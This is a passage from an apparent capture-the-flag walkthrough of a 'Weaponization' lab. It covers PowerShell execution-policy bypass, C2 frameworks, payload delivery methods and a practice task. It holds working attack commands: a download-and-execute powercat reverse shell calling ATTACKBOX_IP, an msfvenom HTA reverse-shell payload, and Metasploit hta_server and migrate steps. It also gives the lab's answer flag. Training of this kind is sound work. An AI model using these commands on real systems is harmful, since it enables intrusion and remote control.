<a id=__codelineno-3-7 name=__codelineno-3-7 href=#__codelineno-3-7></a><span class=no>[Y] Yes [A] Yes to All [N] No [L] No to All [S]</span> <span class=n>Suspend</span> <span class=p>[?]</span> <span class=n>Help</span> <span class=p>(</span><span class=k>default</span> <span class=n>is</span> <span class=s2>&quot;N&quot;</span><span class=p>):</span> <span class=n>A</span>
</code></pre></div> <h3 id=bypass-execution-policy><strong>Bypass Execution Policy</strong><a class=headerlink href=#bypass-execution-policy title="Permanent link">&para;</a></h3> <p>Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> command to change it to your desired setting. For example, we can change it to <code>bypass</code> policy which means nothing is blocked or restricted. This is useful since that lets us run our own <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> scripts.</p> <p>In order to make sure our <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> file gets executed, we need to provide the bypass option in the arguments as follows,</p> <div class=highlight><span class=filename>CMD</span><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=n>C</span><span class=p>:\</span><span class=n>Users</span><span class=p>\</span><span class=n>thm</span><span class=p>\</span><span class=n>Desktop</span><span class=p>&gt;</span><span class=n>powershell</span> <span class=n>-ex</span> <span class=n>bypass</span> <span class=o>-File</span> <span class=n>thm</span><span class=p>.</span><span class=n>ps1</span>
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a><span class=n>Welcome</span> <span class=n>to</span> <span class=n>Weaponization</span> <span class=n>Room</span><span class=p>!</span>
</code></pre></div> <p>Now, let's try to get a reverse shell using one of the tools written in <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr>, which is <code>powercat</code>. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.</p> <div class=highlight><span class=filename>CMD</span><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=n>user</span><span class=nv>@machine</span><span class=p>$</span> <span class=n>git</span> <span class=n>clone</span> <span class=n>https</span><span class=p>://</span><span class=n>github</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>besimorhino</span><span class=p>/</span><span class=n>powercat</span><span class=p>.</span><span class=n>git</span>
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a><span class=n>Cloning</span> <span class=n>into</span> <span class=s1>&#39;powercat&#39;</span><span class=p>...</span>
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a><span class=n>remote</span><span class=p>:</span> <span class=n>Enumerating</span> <span class=n>objects</span><span class=p>:</span> <span class=n>239</span><span class=p>,</span> <span class=n>done</span><span class=p>.</span>
<a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a><span class=n>remote</span><span class=p>:</span> <span class=n>Counting</span> <span class=n>objects</span><span class=p>:</span> <span class=n>100</span><span class=p>%</span> <span class=p>(</span><span class=n>4</span><span class=p>/</span><span class=n>4</span><span class=p>),</span> <span class=n>done</span><span class=p>.</span>
<a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a><span class=n>remote</span><span class=p>:</span> <span class=n>Compressing</span> <span class=n>objects</span><span class=p>:</span> <span class=n>100</span><span class=p>%</span> <span class=p>(</span><span class=n>4</span><span class=p>/</span><span class=n>4</span><span class=p>),</span> <span class=n>done</span><span class=p>.</span>
<a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a><span class=n>remote</span><span class=p>:</span> <span class=n>Total</span> <span class=n>239</span> <span class=p>(</span><span class=n>delta</span> <span class=n>0</span><span class=p>),</span> <span class=n>reused</span> <span class=n>2</span> <span class=p>(</span><span class=n>delta</span> <span class=n>0</span><span class=p>),</span> <span class=n>pack-reused</span> <span class=n>235</span>
<a id=__codelineno-5-7 name=__codelineno-5-7 href=#__codelineno-5-7></a><span class=n>Receiving</span> <span class=n>objects</span><span class=p>:</span> <span class=n>100</span><span class=p>%</span> <span class=p>(</span><span class=n>239</span><span class=p>/</span><span class=n>239</span><span class=p>),</span> <span class=n>61</span><span class=p>.</span><span class=n>75</span> <span class=n>KiB</span> <span class=p>|</span> <span class=n>424</span><span class=p>.</span><span class=n>00</span> <span class=n>KiB</span><span class=p>/</span><span class=n>s</span><span class=p>,</span> <span class=n>done</span><span class=p>.</span>
<a id=__codelineno-5-8 name=__codelineno-5-8 href=#__codelineno-5-8></a><span class=n>Resolving</span> <span class=n>deltas</span><span class=p>:</span> <span class=n>100</span><span class=p>%</span> <span class=p>(</span><span class=n>72</span><span class=p>/</span><span class=n>72</span><span class=p>),</span> <span class=n>done</span><span class=p>.</span>
</code></pre></div> <p>Now, we need to set up a web server on that AttackBox to serve the <code>powercat.ps1</code> that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port <code>8080</code>.</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=n>user</span><span class=nv>@machine</span><span class=p>$</span> <span class=nb>cd </span><span class=n>powercat</span>
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a><span class=n>user</span><span class=nv>@machine</span><span class=p>$</span> <span class=n>python3</span> <span class=n>-m</span> <span class=n>http</span><span class=p>.</span><span class=n>server</span> <span class=n>8080</span>
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a><span class=n>Serving</span> <span class=n>HTTP</span> <span class=n>on</span> <span class=n>0</span><span class=p>.</span><span class=n>0</span><span class=p>.</span><span class=n>0</span><span class=p>.</span><span class=n>0</span> <span class=n>port</span> <span class=n>8080</span> <span class=p>(</span><span class=n>http</span><span class=p>://</span><span class=n>0</span><span class=p>.</span><span class=n>0</span><span class=p>.</span><span class=n>0</span><span class=p>.</span><span class=n>0</span><span class=p>:</span><span class=n>8080</span><span class=p>/)</span> <span class=p>...</span>
</code></pre></div> <p>On the AttackBox, we need to listen on port <code>1337</code> using <code>nc</code> to receive the connection back from the victim.</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a><span class=n>user</span><span class=nv>@machine</span><span class=p>$</span> <span class=n>nc</span> <span class=n>-lvp</span> <span class=n>1337</span>
</code></pre></div> <p>Now, from the victim machine, we download the payload and execute it using <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> payload as follows,</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a><span class=n>C</span><span class=p>:\</span><span class=n>Users</span><span class=p>\</span><span class=n>thm</span><span class=p>\</span><span class=n>Desktop</span><span class=p>&gt;</span> <span class=n>powershell</span> <span class=n>-c</span> <span class=s2>&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://ATTACKBOX_IP:8080/powercat.ps1&#39;);powercat -c ATTACKBOX_IP -p 1337 -e cmd&quot;</span>
</code></pre></div> <p>Now that we have executed the command above, the victim machine downloads the <code>powercat.ps1</code> payload from our web server (on the AttackBox) and then executes it locally on the target using <code>cmd.exe</code> and sends a connection back to the AttackBox that is listening on port <code>1337</code>. After a couple of seconds, we should receive the connection call back:</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a><span class=n>user</span><span class=nv>@machine</span><span class=p>$</span> <span class=n>nc</span> <span class=n>-lvp</span> <span class=n>1337</span>  <span class=n>listening</span> <span class=n>on</span> <span class=no>[any]</span> <span class=n>1337</span> <span class=p>...</span>
<a id=__codelineno-9-2 name=__codelineno-9-2 href=#__codelineno-9-2></a><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>12</span><span class=p>.</span><span class=n>53</span><span class=p>:</span> <span class=n>inverse</span> <span class=n>host</span> <span class=n>lookup</span> <span class=n>failed</span><span class=p>:</span> <span class=n>Unknown</span> <span class=n>host</span>
<a id=__codelineno-9-3 name=__codelineno-9-3 href=#__codelineno-9-3></a><span class=n>connect</span> <span class=n>to</span> <span class=p>[</span><span class=n>10</span><span class=p>.</span><span class=n>8</span><span class=p>.</span><span class=n>232</span><span class=p>.</span><span class=n>37</span><span class=p>]</span> <span class=n>from</span> <span class=p>(</span><span class=n>UNKNOWN</span><span class=p>)</span> <span class=p>[</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>12</span><span class=p>.</span><span class=n>53</span><span class=p>]</span> <span class=n>49804</span>
<a id=__codelineno-9-4 name=__codelineno-9-4 href=#__codelineno-9-4></a><span class=n>Microsoft</span> <span class=n>Windows</span> <span class=no>[Version 10.0.14393]</span>
<a id=__codelineno-9-5 name=__codelineno-9-5 href=#__codelineno-9-5></a><span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=n>2016</span> <span class=n>Microsoft</span> <span class=n>Corporation</span><span class=p>.</span> <span class=n>All</span> <span class=n>rights</span> <span class=n>reserved</span><span class=p>.</span>
<a id=__codelineno-9-6 name=__codelineno-9-6 href=#__codelineno-9-6></a>
<a id=__codelineno-9-7 name=__codelineno-9-7 href=#__codelineno-9-7></a><span class=n>C</span><span class=p>:\</span><span class=n>Users</span><span class=p>\</span><span class=n>thm</span><span class=p>&gt;</span>
</code></pre></div> <h2 id=task-7-command-and-control-c2-or-cc><strong>Task 7: Command And Control - (<abbr title="Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a reverse shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.">C2</abbr> Or C&amp;C)</strong><a class=headerlink href=#task-7-command-and-control-c2-or-cc title="Permanent link">&para;</a></h2> <p>This task introduces the basic concept of Command and Control (<abbr title="Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a reverse shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.">C2</abbr>) frameworks used in Red team operations.</p> <p><img alt="Alt text" src=image-1.png></p> <h3 id=what-is-command-and-control-c2><strong>What is Command and Control (<abbr title="Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a reverse shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.">C2</abbr>)?</strong><a class=headerlink href=#what-is-command-and-control-c2 title="Permanent link">&para;</a></h3> <p><abbr title="Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a reverse shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.">C2</abbr> frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. <abbr title="Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a reverse shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.">C2</abbr> is considered one of the most important tools for red teamers during offensive cyber operations. <abbr title="Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a reverse shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.">C2</abbr> frameworks provide fast and straightforward approaches to:</p> <ul> <li>Generate various malicious payloads</li> <li>Enumerate the compromised machine/networks</li> <li>Perform privilege escalation and pivoting</li> <li>Lateral movement </li> <li>And many others</li> </ul> <p>Some popular <abbr title="Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a reverse shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.">C2</abbr> frameworks that we'll briefly highlight are Cobalt Strike, <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> Empire, Metasploit. Most of these frameworks aim to support a convenient environment to share and communicate between red team operations once the initial access is gained to a system.</p> <h3 id=cobalt-strike><strong>Cobalt Strike</strong><a class=headerlink href=#cobalt-strike title="Permanent link">&para;</a></h3> <p>Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a unique reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations, including key-logging, files upload and download, VPN deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements.</p> <h3 id=powershell-empire><strong><abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> Empire</strong><a class=headerlink href=#powershell-empire title="Permanent link">&para;</a></h3> <p><abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based on <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> and Python agents. <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> Empire focuses on client-side and post-exploitation of Windows and Active Directory environment. If you want to learn more about <abbr title="PowerShell is a task automation and configuration management program from Microsoft, consisting of a command-line shell and the associated scripting language.">PowerShell</abbr> Empire, we suggest trying out this room: <a href=/blog/room/empire/ >Empire</a>.</p> <h3 id=metasploit><strong>Metasploit</strong><a class=headerlink href=#metasploit title="Permanent link">&para;</a></h3> <p>Metasploit is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations. Metasploit is one of the tools we use in this room to generate payload for our weaponization stage. If you want to learn more about the Metasploit framework, we suggest checking the <a href=/blog/room/metasploit>Metasploit module</a>.</p> <p>Most of the <abbr title="Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a reverse shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.">C2</abbr> frameworks use the techniques mentioned in this room as preparation for the initial access stage. For more details about the <abbr title="Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a reverse shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.">C2</abbr> framework, we invite you to check the <a href=/blog/room/intro-c2/ >Intro to <abbr title="Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a reverse shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.">C2</abbr></a> room.</p> <h2 id=task-8-delivery-techniques><strong>Task 8: Delivery Techniques</strong><a class=headerlink href=#task-8-delivery-techniques title="Permanent link">&para;</a></h2> <h3 id=delivery-techniques><strong>Delivery Techniques</strong><a class=headerlink href=#delivery-techniques title="Permanent link">&para;</a></h3> <p>Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content.</p> <p><img alt="Alt text" src=image-2.png></p> <h3 id=email-delivery><strong>Email Delivery</strong><a class=headerlink href=#email-delivery title="Permanent link">&para;</a></h3> <p>It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit <a href=https://attack.mitre.org/techniques/T1566/001/ >here</a>. This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host.</p> <p>The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record.</p> <p>The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations.</p> <p>Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks.</p> <p><img alt="Alt text" src=image-3.png></p> <h3 id=web-delivery><strong>Web Delivery</strong><a class=headerlink href=#web-delivery title="Permanent link">&para;</a></h3> <p>Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit <a href=https://attack.mitre.org/techniques/T1189/ >here</a>.</p> <p>This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener could be helpful when using this method.</p> <p>In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine.</p> <p><img alt="Alt text" src=image-4.png></p> <h3 id=usb-delivery><strong>USB Delivery</strong><a class=headerlink href=#usb-delivery title="Permanent link">&para;</a></h3> <p>This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, visit <a href=https://attack.mitre.org/techniques/T1091/ >here</a>.</p> <p>Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment.</p> <p>Common USB attacks used to weaponize USB devices include <a href=https://shop.hak5.org/products/usb-rubber-ducky-deluxe>Rubber Ducky</a> and <a href=https://www.minitool.com/news/usbharpoon.html>SBHarpoon</a>, charging USB cable, such as <a href=https://shop.hak5.org/products/omg-cable>O.MG Cable</a>.</p> <h2 id=task-9-practice-arena><strong>Task 9: Practice Arena</strong><a class=headerlink href=#task-9-practice-arena title="Permanent link">&para;</a></h2> <p>We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious <abbr title="HTML Application (HTA) files are files that contain HTML, JScript, and or VBScript code that can be executed on client system. This can to lead to more dynamic applications or remote code execution on a client or victim.">HTA</abbr> links automatically. Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application at <code>http://MACHINE_IP:8080/</code>.</p> <p>Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN.</p> <p><img alt="Alt text" src=image-5.png></p> <p>The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious <abbr title="HTML Application (HTA) files are files that contain HTML, JScript, and or VBScript code that can be executed on client system. This can to lead to more dynamic applications or remote code execution on a client or victim.">HTA</abbr> link, the web application will visit your link.</p> <p><strong>Note for Doc files</strong>: the simulation used in the provided Windows 10 machine will open the malicious Word document and be closed within 90 seconds. In order to get longer prescience, you need to migrate as soon as you receive the connection back. </p> <p>In the Metasploit framework, we can inject our current process into another process on the victim machine using <code>migrate</code>. In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using <code>migrate</code> post-module as follow,</p> <p><div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a><span class=n>meterpreter</span> <span class=p>&gt;</span> <span class=n>run</span> <span class=n>post</span><span class=p>/</span><span class=n>windows</span><span class=p>/</span><span class=n>manage</span><span class=p>/</span><span class=n>migrate</span> 
<a id=__codelineno-10-2 name=__codelineno-10-2 href=#__codelineno-10-2></a>
<a id=__codelineno-10-3 name=__codelineno-10-3 href=#__codelineno-10-3></a><span class=p>[*]</span> <span class=n>Running</span> <span class=n>module</span> <span class=n>against</span> <span class=n>DESKTOP</span><span class=p>-</span><span class=n>1AU6NT4</span>
<a id=__codelineno-10-4 name=__codelineno-10-4 href=#__codelineno-10-4></a><span class=p>[*]</span> <span class=n>Current</span> <span class=n>server</span> <span class=k>process</span><span class=p>:</span> <span class=n>svchost</span><span class=p>.</span><span class=n>exe</span> <span class=p>(</span><span class=n>3280</span><span class=p>)</span>
<a id=__codelineno-10-5 name=__codelineno-10-5 href=#__codelineno-10-5></a><span class=p>[*]</span> <span class=n>Spawning</span> <span class=n>notepad</span><span class=p>.</span><span class=n>exe</span> <span class=k>process</span> <span class=n>to</span> <span class=n>migrate</span> <span class=n>into</span>
<a id=__codelineno-10-6 name=__codelineno-10-6 href=#__codelineno-10-6></a><span class=p>[*]</span> <span class=n>Spoofing</span> <span class=n>PPID</span> <span class=n>0</span>
<a id=__codelineno-10-7 name=__codelineno-10-7 href=#__codelineno-10-7></a><span class=p>[*]</span> <span class=n>Migrating</span> <span class=n>into</span> <span class=n>4960</span>
<a id=__codelineno-10-8 name=__codelineno-10-8 href=#__codelineno-10-8></a><span class=p>[+]</span> <span class=n>Successfully</span> <span class=n>migrated</span> <span class=n>into</span> <span class=k>process</span> <span class=n>4960</span>
</code></pre></div> In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell.</p> <p>For reference, you can use the MSFVenom Cheat Sheet on this <a href=https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/ >website</a>.</p> <p><span> <span class="twemoji mdx-heart ans-wu"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M14 20.408c-.492.308-.903.546-1.192.709-.153.086-.308.17-.463.252h-.002a.75.75 0 0 1-.686 0 16.709 16.709 0 0 1-.465-.252 31.147 31.147 0 0 1-4.803-3.34C3.8 15.572 1 12.331 1 8.513 1 5.052 3.829 2.5 6.736 2.5 9.03 2.5 10.881 3.726 12 5.605 13.12 3.726 14.97 2.5 17.264 2.5 20.17 2.5 23 5.052 23 8.514c0 3.818-2.801 7.06-5.389 9.262A31.146 31.146 0 0 1 14 20.408z"></path></svg> </span> <span class="content-wu ans-wu"> Answer the questions below </span> </span></p> <div class="admonition question"> <p class=admonition-title><strong>What is the flag? Hint: Check the user desktop folder for the flag!</strong></p> <div class="tabbed-set tabbed-alternate" data-tabs=1:2><input checked=checked id=__tabbed_1_1 name=__tabbed_1 type=radio><input id=__tabbed_1_2 name=__tabbed_1 type=radio><div class=tabbed-labels><label for=__tabbed_1_1>Answer</label><label for=__tabbed_1_2>Explain</label></div> <div class=tabbed-content> <div class=tabbed-block> <div class=highlight><pre><span></span><code><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a><span class=n>THM</span><span class=p>{</span><span class=n>b4dbc2f16afdfe9579030a929b799719</span><span class=p>}</span>
</code></pre></div> </div> <div class=tabbed-block> <p>We will use script from task 4, two way to solve:</p> <ol> <li> <p>The first way:</p> <p>We will create file reverse shell from msfvenom by: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=443 -f hta-psh -o thm.hta</code>. And then send it to vim by <code>python3 -m http.server 8080</code>. </p> <p>In attack machine, listen by <code>nc -lnvp 443</code>. <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-12-1 name=__codelineno-12-1 href=#__codelineno-12-1></a><span class=err></span><span class=p>(</span><span class=n>kali</span><span class=err></span><span class=n>kali</span><span class=p>)-[~]</span>
<a id=__codelineno-12-2 name=__codelineno-12-2 href=#__codelineno-12-2></a><span class=err></span><span class=p>$</span> <span class=n>nc</span> <span class=n>-lvnp</span> <span class=n>443</span>
<a id=__codelineno-12-3 name=__codelineno-12-3 href=#__codelineno-12-3></a><span class=n>listening</span> <span class=n>on</span> <span class=no>[any]</span> <span class=n>443</span> <span class=p>...</span>
<a id=__codelineno-12-4 name=__codelineno-12-4 href=#__codelineno-12-4></a><span class=n>connect</span> <span class=n>to</span> <span class=p>[</span><span class=n>10</span><span class=p>.</span><span class=n>18</span><span class=p>.</span><span class=n>80</span><span class=p>.</span><span class=n>57</span><span class=p>]</span> <span class=n>from</span> <span class=p>(</span><span class=n>UNKNOWN</span><span class=p>)</span> <span class=p>[</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>142</span><span class=p>.</span><span class=n>139</span><span class=p>]</span> <span class=n>49917</span>
<a id=__codelineno-12-5 name=__codelineno-12-5 href=#__codelineno-12-5></a><span class=n>Microsoft</span> <span class=n>Windows</span> <span class=no>[Version 10.0.14393]</span>
<a id=__codelineno-12-6 name=__codelineno-12-6 href=#__codelineno-12-6></a><span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=n>2016</span> <span class=n>Microsoft</span> <span class=n>Corporation</span><span class=p>.</span> <span class=n>All</span> <span class=n>rights</span> <span class=n>reserved</span><span class=p>.</span>
<a id=__codelineno-12-7 name=__codelineno-12-7 href=#__codelineno-12-7></a>
<a id=__codelineno-12-8 name=__codelineno-12-8 href=#__codelineno-12-8></a><span class=n>C</span><span class=p>:\</span><span class=n>app</span><span class=p>&gt;</span><span class=nb>ls </span><span class=n>-a</span>
<a id=__codelineno-12-9 name=__codelineno-12-9 href=#__codelineno-12-9></a><span class=nb>ls </span><span class=n>-a</span>
<a id=__codelineno-12-10 name=__codelineno-12-10 href=#__codelineno-12-10></a><span class=s1>&#39;ls&#39;</span> <span class=n>is</span> <span class=n>not</span> <span class=n>recognized</span> <span class=n>as</span> <span class=n>an</span> <span class=n>internal</span> <span class=n>or</span> <span class=n>external</span> <span class=n>command</span><span class=p>,</span>
<a id=__codelineno-12-11 name=__codelineno-12-11 href=#__codelineno-12-11></a><span class=n>operable</span> <span class=n>program</span> <span class=n>or</span> <span class=n>batch</span> <span class=n>file</span><span class=p>.</span>
</code></pre></div></p> <p>Because this is a reverse shell from windows, you have to use a script to work on windows (using ls like on linux won't work).</p> <p>Now, we will search the Desktop of each user in the machine, we will get the flag</p> </li> <li> <p>The first way: This is a way to help us use linux command on the victim's terminal.</p> <p>Step by step is the same Task 4:</p> <ul> <li>Step 1: msfconsole -q</li> <li>Step 2: use exploit/windows/misc/hta_server</li> <li>Step 3: set LHOST ATTACKER_IP</li> <li>Step 4: set LPORT ATTACKER_PORT_OPEN</li> <li>Step 5: set SRVHOST ATTACKER_IP</li> <li>Step 6: set payload windows/meterpreter/reverse_tcp</li> <li> <p>Step 7: exploit</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-13-1 name=__codelineno-13-1 href=#__codelineno-13-1></a><span class=n>msf6</span> <span class=p>&gt;</span> <span class=n>use</span> <span class=n>exploit</span><span class=p>/</span><span class=n>windows</span><span class=p>/</span><span class=n>misc</span><span class=p>/</span><span class=n>hta_server</span>
<a id=__codelineno-13-2 name=__codelineno-13-2 href=#__codelineno-13-2></a><span class=p>[*]</span> <span class=n>No</span> <span class=n>payload</span> <span class=n>configured</span><span class=p>,</span> <span class=n>defaulting</span> <span class=n>to</span> <span class=n>windows</span><span class=p>/</span><span class=n>meterpreter</span><span class=p>/</span><span class=n>reverse_tcp</span>
<a id=__codelineno-13-3 name=__codelineno-13-3 href=#__codelineno-13-3></a><span class=n>msf6</span> <span class=n>exploit</span><span class=p>(</span><span class=n>windows</span><span class=p>/</span><span class=n>misc</span><span class=p>/</span><span class=n>hta_server</span><span class=p>)</span> <span class=p>&gt;</span> <span class=nb>set </span><span class=n>lhost</span> <span class=n>10</span><span class=p>.</span><span class=n>18</span><span class=p>.</span><span class=n>80</span><span class=p>.</span><span class=n>57</span>
<a id=__codelineno-13-4 name=__codelineno-13-4 href=#__codelineno-13-4></a><span class=n>lhost</span> <span class=p>=&gt;</span> <span class=n>10</span><span class=p>.</span><span class=n>18</span><span class=p>.</span><span class=n>80</span><span class=p>.</span><span class=n>57</span>
<a id=__codelineno-13-5 name=__codelineno-13-5 href=#__codelineno-13-5></a><span class=n>msf6</span> <span class=n>exploit</span><span class=p>(</span><span class=n>windows</span><span class=p>/</span><span class=n>misc</span><span class=p>/</span><span class=n>hta_server</span><span class=p>)</span> <span class=p>&gt;</span> <span class=nb>set </span><span class=n>lport</span> <span class=n>443</span>
<a id=__codelineno-13-6 name=__codelineno-13-6 href=#__codelineno-13-6></a><span class=n>lport</span> <span class=p>=&gt;</span> <span class=n>443</span>
<a id=__codelineno-13-7 name=__codelineno-13-7 href=#__codelineno-13-7></a><span class=n>msf6</span> <span class=n>exploit</span><span class=p>(</span><span class=n>windows</span><span class=p>/</span><span class=n>misc</span><span class=p>/</span><span class=n>hta_server</span><span class=p>)</span> <span class=p>&gt;</span> <span class=nb>set </span><span class=n>srvhost</span> <span class=n>10</span><span class=p>.</span><span class=n>18</span><span class=p>.</span><span class=n>80</span><span class=p>.</span><span class=n>57</span>
<a id=__codelineno-13-8 name=__codelineno-13-8 href=#__codelineno-13-8></a><span class=n>srvhost</span> <span class=p>=&gt;</span> <span class=n>10</span><span class=p>.</span><span class=n>18</span><span class=p>.</span><span class=n>80</span><span class=p>.</span><span class=n>57</span>
<a id=__codelineno-13-9 name=__codelineno-13-9 href=#__codelineno-13-9></a><span class=n>msf6</span> <span class=n>exploit</span><span class=p>(</span><span class=n>windows</span><span class=p>/</span><span class=n>misc</span><span class=p>/</span><span class=n>hta_server</span><span class=p>)</span> <span class=p>&gt;</span>  <span class=nb>set </span><span class=n>payload</span> <span class=n>windows</span><span class=p>/</span><span class=n>meterpreter</span><span class=p>/</span><span class=n>reverse_tcp</span>
<a id=__codelineno-13-10 name=__codelineno-13-10 href=#__codelineno-13-10></a><span class=n>payload</span> <span class=p>=&gt;</span> <span class=n>windows</span><span class=p>/</span><span class=n>meterpreter</span><span class=p>/</span><span class=n>reverse_tcp</span>
<a id=__codelineno-13-11 name=__codelineno-13-11 href=#__codelineno-13-11></a><span class=n>msf6</span> <span class=n>exploit</span><span class=p>(</span><span class=n>windows</span><span class=p>/</span><span class=n>misc</span><span class=p>/</span><span class=n>hta_server</span><span class=p>)</span> <span class=p>&gt;</span> <span class=n>exploit</span>
<a id=__codelineno-13-12 name=__codelineno-13-12 href=#__codelineno-13-12></a><span class=p>[*]</span> <span class=n>Exploit</span> <span class=n>running</span> <span class=n>as</span> <span class=n>background</span> <span class=n>job</span> <span class=n>0</span><span class=p>.</span>
